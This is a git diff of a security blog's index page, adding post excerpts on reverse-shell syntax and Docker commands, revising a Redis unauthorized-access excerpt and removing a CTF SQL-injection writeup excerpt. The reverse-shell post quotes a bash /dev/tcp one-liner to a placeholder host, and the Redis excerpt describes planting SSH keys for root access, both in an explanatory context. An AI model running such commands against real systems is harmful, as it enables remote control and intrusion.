@@ -293,6 +293,274 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2019/03/04/反弹shell语句的理解/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="m3lon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/UMR.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m3lon">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/04/反弹shell语句的理解/" itemprop="url">反弹shell语句的理解</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-04T15:52:50+08:00">
+                2019-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+          前言一直以来，只会有反弹shell的语句，却对其中的细节不甚了解，比如下面这句最经典的1/bin/bash -i &gt;&amp; /dev/tcp/[yourip]/[yourport] 0&gt;&amp;1
+文件描述符三种标准的文件描述符
+
+0 - stdin 标准输入1 - stdout 标准输出2 - stderr 标准错误输出
+
+&gt;&amp;&amp;根据后面的参数不同会有不同的结果。
+
+当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。
+当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符
+
+理解反弹shell语
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/03/04/反弹shell语句的理解/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+	  
+    
+      	   
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2019/03/01/docker-常用命令备份/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="m3lon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/UMR.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m3lon">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/01/docker-常用命令备份/" itemprop="url">Docker 常用命令备份</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-01T15:50:30+08:00">
+                2019-03-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+          Docker vs 虚拟机传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便
+三个基本概念镜像操作系统分为内核和文件系统，而景象就相当于root文件系统。除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。
+容器容器与景象的关系就像是面向对象中的类与实例。容器的实质是进程，容器的进程运行在属于自己的独特的命名空间，因此容器可以拥有自己的root文件系统，自己的网络配置
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/03/01/docker-常用命令备份/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+	  
+    
+      	   
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2019/02/27/redis未授权访问/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -312,7 +580,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/02/27/redis未授权访问/" itemprop="url">redis未授权访问</a></h1>
+                <a class="post-title-link" href="/2019/02/27/redis未授权访问/" itemprop="url">Redis未授权访问</a></h1>
         
 
         <div class="post-meta">
@@ -364,9 +632,9 @@
       
         
           
-          1. Reids介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。
-2. 漏洞介绍Reids因配置不当可导致未授权访问漏洞，攻击者无需认证即可登陆Redis内部数据，可导致敏感信息泄漏；在特定条件下，Redis服务以root身份运行，攻击者可通过Reids命令给Root用户写入SSH公钥，直接通过SSH登陆受害服务器，导致服务器权限被获取、文件泄漏、重要数据删除、加密勒索等事件发生，严重威胁业务正常服务。
-3. 漏洞原因Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 
+          Reids介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。
+漏洞介绍Reids因配置不当可导致未授权访问漏洞，攻击者无需认证即可登陆Redis内部数据，可导致敏感信息泄漏；在特定条件下，Redis服务以root身份运行，攻击者可通过Reids命令给Root用户写入SSH公钥，直接通过SSH登陆受害服务器，导致服务器权限被获取、文件泄漏、重要数据删除、加密勒索等事件发生，严重威胁业务正常服务。
+漏洞原因Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1371,326 +1639,6 @@ level 11g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmg
 
 	  
     
-      	   
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2018/05/29/python-进制、字符串、字节串之间各种转换/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="m3lon">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/UMR.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="m3lon">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/05/29/python-进制、字符串、字节串之间各种转换/" itemprop="url">python 进制、字符串、字节串之间各种转换</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-29T17:40:56+08:00">
-                2018-05-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          进制转换(以下默认为python环境 16代表16进制)：
-
-十六进制转十进制: int(“0x10”,16)  或者直接输入0x16回车
-
-十进制转十六进制: hex(16)
-
-int(x, base=10) 函数用于将一个字符串或数字转换为整型。
-oct(x) 函数将一个整数转换成8进制字符串。
-bin(x) 返回一个整数 int 或者长整数 long int 的二进制表示。
-
-
-
-整数转字符串
-16进制转字符串： 
-12import binasciiprint binascii.a2b_hex(hexstr) #参数需要是字符串形式 '323648'
-
-base64转字符串
-1234im
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/05/29/python-进制、字符串、字节串之间各种转换/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-	  
-    
-      	   
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2018/05/29/TSCTF-Misc-Web-writeup/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="m3lon">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/UMR.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="m3lon">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/05/29/TSCTF-Misc-Web-writeup/" itemprop="url">TSCTF Misc&Web writeup</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-29T12:08:06+08:00">
-                2018-05-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          Buy Flag这道题跟今天强网杯的Three hit如出一辙，题目是一个二次注入，用户注册会将age存入数据库，登陆成功后index.php界面会从数据库中查询具有相同age的username。
-二次注入：源于开发人员对数据库中的数据太过信任，凡是提取数据库中来自用户的数据不经过处理，即可触发二次注入。
-刚开始做这道题的时候查看html源码发现
-1234567891011  function BuyFlag()&#123;if(!true)&#123;	alert('Please sign in first!');&#125;      else if(18&gt;18)&#123;    
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/05/29/TSCTF-Misc-Web-writeup/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-	  
-    
   </section>
 
   
@@ -1743,7 +1691,7 @@ base64转字符串
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1753,7 +1701,7 @@ base64转字符串
               
               
               <div class="site-state-item site-state-categories">
-                <a href="/CTF/index.html">
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
@@ -1837,26 +1785,6 @@ base64转字符串
 
 
         
-<div class="busuanzi-count">
-  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-  
-    <span class="site-uv">
-      <i class="fa fa-user"></i> 访问人数
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-      人
-    </span>
-  
-
-  
-    <span class="site-pv">
-      <i class="fa fa-eye"></i> 总访问量
-      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
-      次
-    </span>
-  
-</div>
-
 
 
 
